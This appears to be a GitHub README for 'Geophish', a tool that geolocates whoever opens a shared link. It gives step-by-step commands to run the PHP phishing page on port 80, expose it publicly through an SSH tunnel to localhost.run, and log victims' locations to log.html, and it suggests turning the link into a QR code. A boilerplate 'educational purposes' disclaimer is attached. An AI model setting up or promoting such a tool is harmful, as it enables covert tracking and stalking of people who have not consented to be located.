
# Geophish
Geolocate any device with a link
# How to use
1.  Update and install PHP
```bash
sudo apt update
sudo apt upgrade -y
sudo apt install -y php 
```
2. Clone repo and set permissions.
```bash
git clone https://github.com/Jhoel777ar/Geophish.git
cd Geophish
chmod o+w log.html
```
3. Start web server with PHP.
```bash
php -S 0.0.0.0:80
```
4. Expose your website to the internet.
Create a tunnel using [localhost.run](http://localhost.run/)

`ssh -R 80:localhost:80 nokey@localhost.run`
You should see a link with this format: `https://u83450tuntg.lhr.life`, make sure you use HTTPS.

5. Logs will be saved into `log.html`

## Disclaimer
Usage of these scripts for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. Only use for educational purposes.


## Link

Share and test

If you want to share the lab link, the
Reliable web generators (interface): https://www.qr-code-generator.com/ — use it only for links you generate.

<img width="1321" height="739" alt="Image" src="https://github.com/user-attachments/assets/c6b6ccf2-64ac-47e7-b265-e1293471a9d7" />
<img width="1210" height="693" alt="Image" src="https://github.com/user-attachments/assets/b4dc21e2-dde0-4645-abbb-2c162a2ce3fb" />

